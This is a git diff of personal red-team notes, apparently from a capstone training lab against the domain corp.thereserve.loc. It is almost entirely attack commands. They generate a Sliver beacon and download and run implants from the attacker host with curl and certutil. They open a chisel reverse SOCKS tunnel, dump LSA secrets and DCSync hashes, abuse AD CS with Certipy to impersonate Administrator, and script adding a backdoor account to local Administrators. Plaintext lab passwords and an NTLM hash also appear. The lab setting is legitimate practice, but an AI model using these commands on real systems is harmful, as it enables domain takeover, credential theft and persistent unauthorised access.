@@ -142,7 +142,8 @@ stabilitythroughcurrency
 # login for flags
 Username: nvm
 Password: PvH2VJqhnPMcbc0t
-# 
+# Powershell flags for the UTF-16
+set-content -path .\nvm.txt -value ''
 
 # Linux VPN
 generate beacon --mtls 10.50.114.111:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN/VPN-update
@@ -186,9 +187,9 @@ sudo cp authorized_keys /root/.ssh/authorized_keys
 ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "10.200.117.12"
 ssh -i vpn_root.rsa root@10.200.117.12
 # Tools
-curl http://10.50.114.111:8443/VPN-upgrade -o VPN-upgrade
+curl http://10.50.114.111:8443/VPN/VPN-update -o VPN-update
 # As root
-nohup ./VPN-upgrade &
+nohup ./VPN-update &
 
 # As www-data
 ./chisel server -host 10.50.114.111 -p 20000 --reverse --socks5 -v
@@ -205,9 +206,13 @@ proxychains4 xfreerdp /u:mohammad.ahmed /p:Password1! /v:10.200.117.21
 # google chrome http://10.50.114.111:8443/ 
 # Download Word.exe 
 # open powershell 
+proxychains4 crackmapexec smb 10.200.117.31 -u 'svcScanning' -p 'Password1!'
+proxychains4 crackmapexec smb 10.200.117.31 -u 'svcBackups' -p 'q9nzssaFtGHdqUV3Qv6G' --pass-pol
+proxychains4 crackmapexec smb 10.200.117.31 -u 'svcBackups' -p 'q9nzssaFtGHdqUV3Qv6G' --lsa
+
+proxychains4 impacket-secretsdump -just-dc -dc-ip 10.200.117.102 corp.thereserve.loc/svcBackups@10.200.117.102 -outputfile dcsync-dump.hashes
 
 # AD CS Abuse
-
 proxychains4 certipy-ad find -u 'mohammad.ahmed@corp.thereserve.loc' -p 'Password1!' -stdout -enabled -dc-ip 10.200.117.102
 
 proxychains4 certipy-ad req -u 'SERVER1$@corp.thereserve.loc' -hashes 'aad3b435b51404eeaad3b435b51404ee:ee0b312ba706c567436e6a9e08fa3951' -ca 'THERESERVE-CA' -target 'CORPDC.corp.thereserve.loc' -template 'WebManualEnroll' -upn 'Administrator@corp.thereserve.loc' -dns 'CORPDC.corp.thereserve.loc' -dc-ip 10.200.117.102 -ns 10.200.117.102
@@ -218,6 +223,9 @@ proxychains4 certipy-ad auth -dc-ip 10.200.117.102 -ns 10.200.117.102 -pfx admin
 export KRB5CCNAME=/home/kali/RedTeamCapStoneChallenge/data/administrator.ccache
 
 proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.117.102 Administrator@CORPDC.corp.thereserve.loc
+
+certutil.exe -urlcache -split -f http://10.50.114.111:88/Word.exe Word.exe
+
 
 # Linux beacon for later
 curl http://10.50.114.111:8443/VPN-update -o VPN-update
@@ -261,4 +269,50 @@ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 Crying because of password changes
 ```bash
 nohup nmap -sC -sV -p- 10.200.117.0/24 -oN vpn-free-lunch-sc-sv --min-rate 2000 & 
+```
+
+
+Did not work :(
+```powershell
+$user = "NVMthisAccount"
+$pass = convertto-securestring -asplaintext -force -string "da15ADMIN#Nvm"
+$cred = new-object -typename system.management.automation.pscredential($user,$pass)
+
+$session = new-pssession -computername wrk1 -credential $cred
+enter-pssession -session $sessions
+# Sometimes you need to use invoke command instead of $session creation due to shell limitations
+invoke-command -computername $computername -ScriptBlock { hostname }  -Credential $cred
+
+
+psexec \\WRK1 -u $user -p $pass net localgroup Administrators "corp.thereserve\$user"
+
+# https://www.powershellbros.com/add-users-to-local-group-remotely-using-powershell/ thx 
+# Remove the ` 
+xsel -b | sed 's@`@@g'
+
+$Computername = "PC01"
+$Username = "Account1"
+$GroupName = "Event Log Readers"
+$DomainName = $env:USERDOMAIN
+$Group = [ADSI]"WinNT://$ComputerName/$GroupName,group"
+$User = [ADSI]"WinNT://$DomainName/$Username,user"
+$Group.Add($User.Path)
+
+# Then repeatively till all flags I mine
+$Computername = "WRK1"
+$Computername = "SERVER1"
+# Change:
+$GroupName = "Administrators"
+$GroupName = "Remote Desktop Users"
+$GroupName = "Event Log Readers"
+
+$Username = "NVMthisAccount"
+$DomainName = $env:USERDOMAIN
+
+
+$Group = [ADSI]"WinNT://$ComputerName/$GroupName,group"
+$User = [ADSI]"WinNT://$DomainName/$Username,user"
+$Group.Add($User.Path)
+
+Invoke-Command $ComputerName -scriptblock{param($GroupName) net localgroup $GroupName $Username /add } -arg $GroupName | Where-Object {$_ -AND $_ -notmatch "command completed successfully"} | select -skip 4
 ```
